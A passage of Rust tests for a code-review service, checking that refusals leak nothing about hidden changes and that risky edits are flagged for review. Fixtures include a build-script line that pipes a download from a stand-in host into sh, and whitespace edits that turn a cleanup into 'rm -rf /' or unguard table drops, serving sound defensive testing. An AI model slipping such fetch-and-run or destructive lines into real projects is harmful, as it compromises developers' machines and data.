            let rows: Vec<(String, String, String)> = th
                .rt
                .block_on(sqlx::query_as("SELECT id, class_id, policy_key FROM prs WHERE project_id = $1").bind(h.id).fetch_all(&hub.db))
                .unwrap();
            for (id, class, k) in rows {
                if k != key {
                    continue;
                }
                let paths: Vec<String> = th
                    .rt
                    .block_on(sqlx::query_scalar("SELECT path FROM pr_paths WHERE project_id = $1 AND pr = $2").bind(h.id).bind(&id).fetch_all(&hub.db))
                    .unwrap();
                let lines = prs::class::lines_of(&current.policy, paths.iter().map(String::as_str));
                assert_eq!(class, prs::class::class_id(&key, &lines, ""), "{id}: a class of other paths under the current lines");
            }
        }
    }

    /// Nit of cycle 1: to anyone but an admin, a stack is refused by one
    /// message whatever the reason (a path they cannot see, a merge), so a
    /// refusal names no hidden change; admins are told which.
    #[test]
    fn stack_refusals_say_nothing_of_hidden_parts() {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let with = |extra: &[(&str, &str)]| {
            let mut f = base.clone();
            for (p, c) in extra {
                f.insert(p.to_string(), c.as_bytes().to_vec());
            }
            f
        };
        // A stack whose lower change touched fin/ only, under one on pub/.
        let hidden = h.commit(&th, &[b], with(&[("fin/x.txt", "x\n")]), [2; 16], 2_000, None);
        let above_hidden = h.commit(&th, &[hidden], with(&[("fin/x.txt", "x\n"), ("pub/b.rs", "fn b() {}\n")]), [3; 16], 3_000, None);
        // A merge of two changes of pub/.
        let l = h.commit(&th, &[b], with(&[("pub/l.rs", "fn l() {}\n")]), [4; 16], 4_000, None);
        let r = h.commit(&th, &[b], with(&[("pub/r.rs", "fn r() {}\n")]), [5; 16], 5_000, None);
        let m = h.commit(&th, &[l, r], with(&[("pub/l.rs", "fn l() {}\n"), ("pub/r.rs", "fn r() {}\n")]), [6; 16], 6_000, None);
        h.set_branch(&th, "hidden-a1", above_hidden);
        h.set_branch(&th, "merge-a1", m);
        let (dev_id, dev_name) = person_row(&th, "dev");
        let dev = ask_as(&th, &h, &dev_viewer(dev_id));
        let (adm, adm_name) = person_row(&th, "admin");
        let admin = ask_as(&th, &h, &admin_of(adm));
        let msg = |a: &Ask, who: &Caller, head: &str| match th.rt.block_on(prs::create(&h.hub, a, who, CreatePr { head: head.into(), title: "x".into(), ..Default::default() })) {
            Err(Error::Api { code, message, .. }) => format!("{code}: {message}"),
            Ok(v) => panic!("made {v}"),
            Err(e) => panic!("{e:?}"),
        };
        let devc = caller(dev_id, &dev_name);
        let (a, b2) = (msg(&dev, &devc, "hidden-a1"), msg(&dev, &devc, "merge-a1"));
        assert_eq!(a, b2, "one refusal whatever the reason");
        assert!(a.starts_with("forbidden: this cannot be a PR of yours"), "{a}");
        assert!(!a.contains(&veil_core::ChangeId([6; 16]).short()) && !a.contains(&veil_core::ChangeId([2; 16]).short()), "{a}");
        let am = msg(&admin, &caller(adm, &adm_name), &m.hex());
        assert!(am.contains("is a merge"), "admins are told which: {am}");
    }

    /// The risk and gate of a one-change PR that turns `old` into `new` at
    /// `path`, with the default rules.
    fn risk_of(path: &str, old: Option<&str>, new: &str) -> Value {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/keep.rs".into(), b"fn keep() {}\n".to_vec());
        if let Some(o) = old {
            base.insert(path.into(), o.as_bytes().to_vec());
        }
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let mut f = base;
        f.insert(path.into(), new.as_bytes().to_vec());
        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
        let (author, name) = person_row(&th, "author");
        let admin = ask_as(&th, &h, &admin_of(author));
        let v = th.rt.block_on(prs::create(&h.hub, &admin, &caller(author, &name), CreatePr { head: head.hex(), title: "risk".into(), ..Default::default() })).unwrap();
        json!({ "risk": v["risk"], "ready": v["review"]["ready"], "reasons": v["reasons"] })
    }

    /// BUG-1251: "changed only whitespace" ignores where whitespace is, so
    /// a change that joins a line into a comment or splits a token is low
    /// risk: by default it is ready with no approval.
    #[test]
    fn bug_1251_a_whitespace_only_change_that_changes_the_code_needs_no_review() {
        let cases = [
            // A newline turned into a space: `verify()` is now in the comment.
            ("pub/auth.rs", "fn admin() {\n    // check the caller first\n    verify_signature();\n    delete_all();\n}\n", "fn admin() {\n    // check the caller first verify_signature();\n    delete_all();\n}\n"),
            // A space inserted inside a path.
            ("pub/clean.sh", "#!/bin/sh\nrm -rf /tmp/build\n", "#!/bin/sh\nrm -rf / tmp/build\n"),
            // Python: the indentation decides what the `if` guards.
            ("pub/gate.py", "if not user.is_admin:\n    raise Forbidden()\n    drop_tables()\n", "if not user.is_admin:\n    raise Forbidden()\ndrop_tables()\n"),
        ];
        for (path, old, new) in cases {
            let v = risk_of(path, Some(old), new);
            assert_eq!(v["risk"], "normal", "{path}: {v}");
            assert_eq!(v["ready"], false, "{path}: a change of behaviour needs a review: {v}");
        }
    }

    /// BUG-1252: every `*.txt` is "documentation", so a CMake build script
    /// (run on every build, by every developer and CI) is low risk.
    #[test]
    fn bug_1252_a_build_script_named_txt_is_low_risk() {
        let v = risk_of("pub/CMakeLists.txt", Some("project(app)\n"), "project(app)\nexecute_process(COMMAND sh -c \"curl -s https://example.invalid/x | sh\")\n");
        assert_ne!(v["risk"], "low", "{v}");
        assert_eq!(v["ready"], false, "{v}");
    }

    /// BUG-1253: a thread listing holds every comment of every thread of the
    /// PR in one answer (1,000 × 500 × 64 KiB at the limits), and every new
    /// thread or reply answers with it.
    #[test]
    fn bug_1253_a_thread_listing_is_unbounded() {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let mut f = base;
        f.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
        let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
        let (author, name) = person_row(&th, "author");
        let me = caller(author, &name);
        let admin = ask_as(&th, &h, &admin_of(author));
        let hub = h.hub.clone();
        let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: "public".into(), ..Default::default() })).unwrap()["id"]
            .as_str()
            .unwrap()
            .to_string();
        let v = th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "first".into(), anchor: None })).unwrap();
        let t = v["id"].as_str().unwrap().to_string();
        // 400 replies of 60 KB (24 MB), well inside the limits (500 a
        // thread, 1,000 threads): what any participant may post.
        th.rt.block_on(again(|| {
            sqlx::query(
                "INSERT INTO pr_comments (project_id, pr, thread, id, author, body, at) \
                 SELECT $1, $2, $3, lpad(to_hex(i), 12, '0'), $4, repeat('x', 60000), i FROM generate_series(1, 400) AS i",
            )
            .bind(h.id)
            .bind(&id)
            .bind(&t)
            .bind(author)
            .execute(&hub.db)
        }));
        let anyone = ask_as(&th, &h, &Viewer::default());
        let listing = th.rt.block_on(prs::threads_json(&hub, &anyone, &id, None)).unwrap().to_string();
        let reply = th.rt.block_on(prs::update_thread(&hub, &admin, &me, &id, &t, prs::ThreadUpdate { body: Some("one more".into()), state: None })).unwrap().to_string();
        for (what, len) in [("anyone's GET threads", listing.len()), ("a reply's answer", reply.len())] {
            assert!(len <= 4 << 20, "{what} is {len} bytes: one answer holds every comment of the PR");
        }
    }

    /// BUG-1254: refusals of a new revision count the PR's real revisions,
    /// so the author learns of revisions they are shown as one (a rebase
    /// over folders they cannot see).
    #[test]
    fn bug_1254_a_refused_revision_names_the_real_revision_number() {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        // The dev's change, on b.
        let mut f1 = base.clone();
        f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
        let r1 = h.commit(&th, &[b], f1, [2; 16], 3_000, None);
        h.set_branch(&th, "feature", r1);
        let (dev_id, dev_name) = person_row(&th, "dev");
        let dev_caller = caller(dev_id, &dev_name);
        let dev = ask_as(&th, &h, &dev_viewer(dev_id));
        let hub = h.hub.clone();
        let id = th.rt.block_on(prs::create(&hub, &dev, &dev_caller, CreatePr { head: "feature".into(), title: "dev's".into(), ..Default::default() })).unwrap()["id"]
            .as_str()
            .unwrap()
            .to_string();
        // main moves by a change of fin/ only; an admin rebases the PR over
        // it (the same change, time and files of pub/).
        let mut fb2 = base.clone();
        fb2.insert("fin/ledger.txt".into(), b"ledger, hidden edit\n".to_vec());
        let b2 = h.commit(&th, &[b], fb2.clone(), [3; 16], 2_000, None);
        h.set_branch(&th, "main", b2);
        let mut f1b = fb2;
        f1b.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
        let r1b = h.commit(&th, &[b2], f1b, [2; 16], 3_000, None);
        let (adm, adm_name) = person_row(&th, "admin");
        let admin = ask_as(&th, &h, &admin_of(adm));
        th.rt.block_on(prs::add_revision(&hub, &admin, &caller(adm, &adm_name), &id, RevisionRequest { head: r1b.hex() })).unwrap();
        let dev = ask_as(&th, &h, &dev_viewer(dev_id));
        let shown = th.rt.block_on(prs::show(&hub, &dev, &id)).unwrap();
        assert_eq!(shown["revision"], 1, "to the dev, the rebase is the same revision: {shown}");
        let head = shown["revisions"][0]["head"].as_str().unwrap().to_string();
        // The dev asks again for the head they are shown.
        let mut refusals = Vec::new();
        for _ in 0..2 {
            match th.rt.block_on(prs::add_revision(&hub, &dev, &dev_caller, &id, RevisionRequest { head: head.clone() })) {
                Ok(v) => assert_eq!(v["revision"], 1, "{v}"),
                Err(Error::Api { message, .. }) => refusals.push(message),
                Err(e) => panic!("{e:?}"),
            }
        }
        assert!(!refusals.is_empty());
        for m in &refusals {
            assert_eq!(m, "that is revision 1 already", "the dev is shown revision 1 only");
        }
    }

    /// BUG-1255: a new revision carries every anchored thread, each through
    /// its own read and diff of the file, with no deadline: 100 threads on a
    /// file of under 1 MiB (the limit is 1,000).
    #[test]
    fn bug_1255_a_new_revision_carries_every_thread_past_its_deadline() {
        let threads: usize = std::env::var("VEIL_BUG1255_THREADS").ok().and_then(|s| s.parse().ok()).unwrap_or(100);
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let lines = 20_000;
        let big: String = (0..lines).map(|i| format!("let value_{i:06} = compute({i}) + 1; // ........\n")).collect();
        assert!(big.len() < 1 << 20);
        let mut base = Files::new();
        base.insert("pub/big.rs".into(), big.clone().into_bytes());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let edit = |every: usize, tag: &str| -> Files {
            let mut f = base.clone();
            let t: String = big.lines().enumerate().map(|(i, l)| if i % every == 0 { format!("{l} {tag}\n") } else { format!("{l}\n") }).collect();
            f.insert("pub/big.rs".into(), t.into_bytes());
            f
        };
        let r1 = h.commit(&th, &[b], edit(1_000, "one"), [2; 16], 2_000, None);
        let r2 = h.commit(&th, &[b], edit(7, "two"), [2; 16], 3_000, None);
        let (author, name) = person_row(&th, "author");
        let me = caller(author, &name);
        let admin = ask_as(&th, &h, &admin_of(author));
        let hub = h.hub.clone();
        let v = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "big".into(), ..Default::default() })).unwrap();
        let id = v["id"].as_str().unwrap().to_string();
        let change = v["revisions"][0]["changes"][0]["change_id"].as_str().unwrap().to_string();
        // One real anchor, then as many as any participant may add.
        let an = AnchorRequest { change: None, path: "pub/big.rs".into(), side: Some("new".into()), start: 3, end: Some(3) };
        th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "here".into(), anchor: Some(an) })).unwrap();
        let (anchor, at): (String, String) = th
            .rt
            .block_on(sqlx::query_as("SELECT anchor, now_at FROM pr_threads WHERE project_id = $1 AND pr = $2").bind(h.id).bind(&id).fetch_one(&hub.db))
            .unwrap();
        assert!(anchor.contains(&change));
        th.rt.block_on(again(|| {
            sqlx::query(
                "INSERT INTO pr_threads (project_id, pr, id, anchor, now_at, state, author, created_at) \
                 SELECT $1, $2, lpad(to_hex(i), 12, '0'), $3, $4, 'open', $5, i FROM generate_series(1, $6) AS i",
            )
            .bind(h.id)
            .bind(&id)
            .bind(&anchor)
            .bind(&at)
            .bind(author)
            .bind(threads as i32 - 1)
            .execute(&hub.db)
        }));
        let t0 = Instant::now();
        let r = th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() }));
        let took = t0.elapsed();
        eprintln!("{threads} threads: add_revision took {took:?}: {:?}", r.as_ref().map(|_| "ok"));
        assert!(took < Duration::from_secs(10), "one revision took {took:?} with {threads} anchored threads (the request's deadline is 10 s)");
    }
}
